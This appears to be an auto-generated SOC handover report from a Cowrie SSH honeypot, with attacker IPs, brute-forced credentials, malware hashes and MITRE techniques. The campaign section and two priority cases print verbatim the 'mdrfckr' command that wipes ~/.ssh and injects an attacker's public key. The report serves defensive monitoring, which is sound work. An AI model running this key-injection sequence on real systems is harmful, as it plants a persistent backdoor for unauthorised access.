# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-26 |
| **Generated At** | 2026-03-26T16:58:53Z |
| **Shift Time** | 16:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **69** |
| Confirmed Threats | **61** |
| False Positives Filtered | **8** (11.6%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **15** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **64** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28** |
| Unique Credential Pairs | **23** |
| Unique Usernames | **18** |
| Unique Passwords | **22** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `qwerty123456` | 2 |
| `345gs5662d34` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `111111` | `49.124.153.46` | 2026-03-26T15:38:05 |
| `root` | `lekhraj` | `101.32.128.193` | 2026-03-26T15:51:26 |
| `root` | `3245gs5662d34` | `101.32.128.193` | 2026-03-26T15:51:29 |
| `root` | `Qwerty12345` | `103.171.69.82` | 2026-03-26T16:30:59 |
| `root` | `3245gs5662d34` | `103.171.69.82` | 2026-03-26T16:31:02 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.32.128.193`, `103.171.69.82`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **29** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS6079` | RCN | 1 | HIGH |
| `AS57812` | PE Yakovlev Stanislav Stanislavovich | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3a6fca97f0e8

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]46` |
| **First Seen** | 2026-03-26 15:38 |
| **Last Seen** | 2026-03-26 15:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 15:38:02` | `cowrie.session.connect` |
| `2026-03-26 15:38:02` | `cowrie.client.version` |
| `2026-03-26 15:38:03` | `cowrie.client.kex` |
| `2026-03-26 15:38:05` | `cowrie.login.success` |
| `2026-03-26 15:38:05` | `cowrie.direct-tcpip.request` |
| `2026-03-26 15:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]46` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382ebd276228

| Field | Detail |
|---|---|
| **Source IP** | `101.32.128[.]193` |
| **First Seen** | 2026-03-26 15:51 |
| **Last Seen** | 2026-03-26 15:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 15:51:26` | `cowrie.session.connect` |
| `2026-03-26 15:51:26` | `cowrie.client.version` |
| `2026-03-26 15:51:26` | `cowrie.client.kex` |
| `2026-03-26 15:51:26` | `cowrie.login.success` |
| `2026-03-26 15:51:26` | `cowrie.session.params` |
| `2026-03-26 15:51:26` | `cowrie.command.input` |
| `2026-03-26 15:51:26` | `cowrie.command.failed` |
| `2026-03-26 15:51:27` | `cowrie.log.closed` |
| `2026-03-26 15:51:27` | `cowrie.session.params` |
| `2026-03-26 15:51:27` | `cowrie.command.input` |
| `2026-03-26 15:51:27` | `cowrie.session.file_download` |
| `2026-03-26 15:51:27` | `cowrie.log.closed` |
| `2026-03-26 15:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.128[.]193` to AbuseIPDB if not already reported
- [ ] Block `101.32.128[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c802b933db50

| Field | Detail |
|---|---|
| **Source IP** | `101.32.128[.]193` |
| **First Seen** | 2026-03-26 15:51 |
| **Last Seen** | 2026-03-26 15:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 15:51:28` | `cowrie.session.connect` |
| `2026-03-26 15:51:28` | `cowrie.client.version` |
| `2026-03-26 15:51:28` | `cowrie.client.kex` |
| `2026-03-26 15:51:29` | `cowrie.login.success` |
| `2026-03-26 15:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.128[.]193` to AbuseIPDB if not already reported
- [ ] Block `101.32.128[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eeee967e48f

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-03-26 16:30 |
| **Last Seen** | 2026-03-26 16:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 16:30:59` | `cowrie.session.connect` |
| `2026-03-26 16:30:59` | `cowrie.client.version` |
| `2026-03-26 16:30:59` | `cowrie.client.kex` |
| `2026-03-26 16:30:59` | `cowrie.login.success` |
| `2026-03-26 16:31:00` | `cowrie.session.params` |
| `2026-03-26 16:31:00` | `cowrie.command.input` |
| `2026-03-26 16:31:00` | `cowrie.command.failed` |
| `2026-03-26 16:31:00` | `cowrie.log.closed` |
| `2026-03-26 16:31:00` | `cowrie.session.params` |
| `2026-03-26 16:31:00` | `cowrie.command.input` |
| `2026-03-26 16:31:00` | `cowrie.session.file_download` |
| `2026-03-26 16:31:00` | `cowrie.log.closed` |
| `2026-03-26 16:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0dfee7752c

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-03-26 16:31 |
| **Last Seen** | 2026-03-26 16:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-26 16:31:01` | `cowrie.session.connect` |
| `2026-03-26 16:31:01` | `cowrie.client.version` |
| `2026-03-26 16:31:01` | `cowrie.client.kex` |
| `2026-03-26 16:31:02` | `cowrie.login.success` |
| `2026-03-26 16:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.38[.]34` | **24** | 2026-03-26 15:02 | 2026-03-26 15:07 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `3.129.187[.]38` | **6** | 2026-03-26 15:16 | 2026-03-26 15:24 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `103.171.69[.]82` | **5** | 2026-03-26 16:17 | 2026-03-26 16:31 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `128.203.204[.]124` | **2** | 2026-03-26 15:36 | 2026-03-26 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.13.9[.]48` | 1 | 2026-03-26 16:01 | 2026-03-26 16:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.32.128[.]193` | 1 | 2026-03-26 15:51 | 2026-03-26 15:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `108.41.203[.]61` | 1 | 2026-03-26 15:57 | 2026-03-26 15:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `111.70.13[.]240` | 1 | 2026-03-26 15:19 | 2026-03-26 15:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.117.125[.]241` | 1 | 2026-03-26 16:35 | 2026-03-26 16:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.187.147[.]13` | 1 | 2026-03-26 16:03 | 2026-03-26 16:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.228.228[.]86` | 1 | 2026-03-26 15:38 | 2026-03-26 15:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `162.243.117[.]147` | 1 | 2026-03-26 16:40 | 2026-03-26 16:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-03-26 15:49 | 2026-03-26 15:49 | 7s | 0 | `T1592` | 🟢 LOW |
| `183.109.195[.]179` | 1 | 2026-03-26 16:43 | 2026-03-26 16:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `183.171.215[.]115` | 1 | 2026-03-26 15:22 | 2026-03-26 15:22 | 7s | 0 | `T1592` | 🟢 LOW |
| `183.195.131[.]206` | 1 | 2026-03-26 16:20 | 2026-03-26 16:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.83.176[.]64` | 1 | 2026-03-26 16:40 | 2026-03-26 16:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]29` | 1 | 2026-03-26 16:40 | 2026-03-26 16:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `192.162.36[.]86` | 1 | 2026-03-26 15:05 | 2026-03-26 15:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.182.17[.]231` | 1 | 2026-03-26 16:21 | 2026-03-26 16:21 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.77.88[.]90` | 1 | 2026-03-26 15:25 | 2026-03-26 15:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `64.121.48[.]198` | 1 | 2026-03-26 16:02 | 2026-03-26 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.56.112[.]44` | 1 | 2026-03-26 15:43 | 2026-03-26 15:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `221.182.17[.]231` | CN | China Mobile Communications Corporation | **100** ⚠️ | 14 |
| `183.109.195[.]179` | KR | Korea Telecom | **100** ⚠️ | 48 |
| `192.162.36[.]86` | RU | PE Yakovlev Stanislav Stanislavovich | **100** ⚠️ | 3 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `103.171.69[.]82` | BD | Multilink International | **100** ⚠️ | 1 |
| `49.124.153[.]46` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 17 |
| `101.32.128[.]193` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 36 |
| `122.228.228[.]86` | CN | Cloud computing company China Telecom Co | **100** ⚠️ | 23 |
| `111.70.13[.]240` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `108.41.203[.]61` | US | Verizon Business | **100** ⚠️ | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 28 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 19 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 69 cases |
| Tool 34  | Credential Extractor        | ✅ 28 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (11.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 23 recon entry/entries in table (4 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T16:58:53Z_
